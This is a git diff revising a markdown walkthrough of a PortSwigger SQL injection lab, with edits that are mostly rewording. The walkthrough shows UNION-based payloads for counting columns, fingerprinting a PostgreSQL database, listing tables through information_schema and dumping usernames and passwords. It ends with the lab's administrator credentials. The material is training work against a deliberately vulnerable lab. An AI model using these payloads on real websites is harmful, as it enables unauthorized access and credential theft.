@@ -1,4 +1,4 @@
-# SQLi Lab #5 Writeup
+# PortSwigger SQLi Lab #5 Write-Up
 
 https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
 
@@ -17,7 +17,7 @@ Each payload will be entered right after the "gifts" part of the URL, as the cat
 
 <br>
 
-> Don't forget to 'ctrl u' or 'command u' in order to URL encode your paylod.
+> Don't forget to 'ctrl u' or 'command u' in order to URL encode each paylod.
 
 
 
@@ -60,7 +60,7 @@ Because this was solved iteratively, the amount of columns is: 3 - 1 = 2.
 ### **2. Determine the data types of the columns.**
 
 <br>
-Since both columns of data on the website are just text, the initial guess is that both columns are strings.
+Since both columns of data on the website seem to be just text, the initial guess is that both columns are strings.
 
 ```SQL
 ' UNION select 'a', 'a'--
@@ -79,9 +79,10 @@ Due to the 200 status code, both of the columns are strings. If there were an er
 
 ### **3. Find the the type and version of the database.**
 
-I'll be using the following link as a cheat sheet.
+Use the following link as a cheat sheet.
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
+<br>
 
 Microsoft Database Version Payload:
 ```SQL
@@ -97,7 +98,7 @@ PostgreSQL Database Version Payload:
 ```
 200 status code; it is a postgreSQL database.
 
-After looking into the 200 response, I can see that the version is the following:
+After looking into the 200 response, the version of the postgreSQL can be found.
 
 ```HTML
 <th>
@@ -115,7 +116,8 @@ x86_64-pc-linux-gnu, compiled by gcc
 #
 
 ### **4. Now that the database type is known, find the table names within the database.**
-The portswigger cheat sheet shows to use the following to try and info from postgreSQL databases.
+
+Use the following from the cheat sheet to get info from postgreSQL databases.
 ```SQL
 SELECT * FROM information_schema.tables
 ```
@@ -159,7 +161,7 @@ Instead of *, the postgreSQL website shows that the name of columns is column_na
 ```
 200 status code
 
-Two of the columns in the response are named password and username. 
+Two of the columns in the response are named 'password' and 'username'. 
 
 <br>
 
@@ -169,17 +171,22 @@ Two of the columns in the response are named password and username.
 
 #
 
-### **6. Now that the table and columns are known, call them using a standard UNION injection.**
+### **6. Now that the table and columns are known, call them using a simple 'UNION select' injection.**
 
 ```SQL
 ' UNION select username, password FROM users--
 ```
 200 status code
 
-The final injection gives the administrator password and username displayed in the response.
+The final injection displays the administrator username and password in the response.
+
 ```HTML
-                           <th>administrator</th>
-                            <td>787wo1nrar3t43x9pcko</td>
+<th>
+administrator
+</th>
+    <td>
+    787wo1nrar3t43x9pcko
+    </td>
 ```
 
 <br>
@@ -192,7 +199,7 @@ The final injection gives the administrator password and username displayed in t
 
 #
 
-### **7. Return to the login page of the vulnerable website and login with that information.**
+### **7. Return to the login page of the vulnerable website and login with the administrator's username and password.**
 
 
 <br>
